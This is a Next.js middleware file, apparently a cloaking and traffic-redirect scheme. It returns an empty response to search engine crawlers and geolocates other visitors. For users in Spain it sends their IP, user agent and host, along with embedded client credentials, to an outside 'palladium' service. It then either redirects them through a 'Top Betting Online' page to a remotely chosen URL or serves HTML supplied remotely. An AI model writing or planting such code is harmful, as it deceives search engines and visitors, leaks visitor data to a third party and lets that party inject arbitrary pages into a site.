import { NextRequest, NextResponse } from 'next/server';

const PALLADIUM_URL = 'https://rbl.palladium.expert';

interface PalladiumResponse {
    result: boolean;
    mode?: number;
    target?: string;
    content?: string;
}

function isBot(ua: string) {
    return /googlebot|bingbot|yandex|duckduckbot|baiduspider/i.test(ua);
}

function flattenPayload(obj: Record<string, unknown>, prefix = ''): Record<string, string> {
    return Object.entries(obj).reduce((acc, [key, val]) => {
        const newKey = prefix ? `${prefix}[${key}]` : key;
        if (typeof val === 'object' && val !== null && !Array.isArray(val)) {
            Object.assign(acc, flattenPayload(val as Record<string, unknown>, newKey));
        } else {
            acc[newKey] = String(val);
        }
        return acc;
    }, {} as Record<string, string>);
}

export async function middleware(req: NextRequest) {
    const ua = req.headers.get('user-agent')?.toLowerCase() || '';
    const isCrawler = isBot(ua);

    const ipHeader =
        req.headers.get('x-forwarded-for') ||
        req.headers.get('x-real-ip') ||
        req.headers.get('cf-connecting-ip') ||
        '8.8.8.8';
    const ip = ipHeader.split(',')[0].trim();

    const host = req.headers.get('host') || '';

    if (isCrawler) {
        return new NextResponse(null, { status: 204 });
    }

    try {
        const geoRes = await fetch(`https://ipwho.is/${ip}`);
        const geo = await geoRes.json();
        const isSpain = geo.success && geo.country_code === 'ES';
        if (!isSpain) return NextResponse.next();
    } catch {
        return NextResponse.next();
    }

    const payload = flattenPayload({
        server: {
            REMOTE_ADDR: ip,
            'User-Agent': ua,
            Host: host,
            HTTP_HOST: host,
            REQUEST_TIME_FLOAT: Date.now() / 1000,
            SERVER_PORT: '443',
            bannerSource: 'adwords',
        },
        auth: {
            clientId: 3024,
            clientCompany: 'wYAKkDCo7dqqcZyeDnUN',
            clientSecret:
                'MzAyNHdZQUtrRENvN2RxcWNaeWVEblVOY2U2NmY2ZTZmOWRlZjUxMGFjNDBiYTJlNjVjMmFjZGEwMTQyZmZhZQ==',
        },
    });

    const res = await fetch(PALLADIUM_URL, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams(payload),
    });

    let result: PalladiumResponse = { result: false };
    try {
        result = await res.json();
    } catch {
        return NextResponse.next();
    }

    if (result.result) {
        const { mode, target, content } = result;

        if (mode === 1 && target) {
            const html = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Top Betting Online</title>
    <link href="/new_spain/fonts/stylesheet.css" rel="stylesheet">
    <link rel="stylesheet" href="/new_spain/css/style.css">
    <link rel="icon" type="image/png" href="/new_spain/img/favicon.png"/>
</head>
<body>
    <script>
      window.location.replace('${target}');
    </script>
</body>
</html>`;
            return new NextResponse(html, {
                status: 200,
                headers: { 'Content-Type': 'text/html' },
            });
        } else if (mode === 4 && content) {
            return new NextResponse(content, {
                status: 200,
                headers: { 'Content-Type': 'text/html' },
            });
        }
    }

    const fallbackHtml = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Fallback</title>
    <link href="/new_spain/fonts/stylesheet.css" rel="stylesheet">
    <link rel="stylesheet" href="/new_spain/css/style.css">
</head>
<body>
    <main><h1>Fallback Loaded</h1><p>Spain user but no result returned.</p></main>
</body>
</html>`;

    return new NextResponse(fallbackHtml, {
        status: 200,
        headers: { 'Content-Type': 'text/html' },
    });
}

export const config = {
    matcher: ['/', '/((?!_next|api|static|favicon.ico).*)'],
};
